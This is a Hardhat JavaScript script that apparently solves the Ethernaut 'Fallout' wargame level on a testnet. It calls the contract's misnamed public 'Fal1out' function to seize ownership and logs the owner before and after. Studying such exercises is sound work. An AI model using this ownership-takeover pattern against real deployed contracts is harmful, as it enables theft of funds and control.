const { ethers, network, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");
const {
  abi: FalloutABI,
} = require("../artifacts/contracts/02-fallout/Fallout.sol/Fallout.json");

async function attack() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;

    const [attacker] = await ethers.getSigners();
    const attackerAddr = await attacker.getAddress();

    const aFallout = networkConfig[chainId]["fallout"];
    const cFallout = new ethers.Contract(aFallout, FalloutABI, attacker);

    const ownerBefore = await cFallout.owner();
    console.log("Fallout contract owner before attack: ", ownerBefore);

    console.log("Attacking...");
    const tx1 = await cFallout.Fal1out({ value: "1" });
    await tx1.wait();

    const ownerAfter = await cFallout.owner();
    console.log("Fallout contract owner after attack: ", ownerAfter);
  }
}

attack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
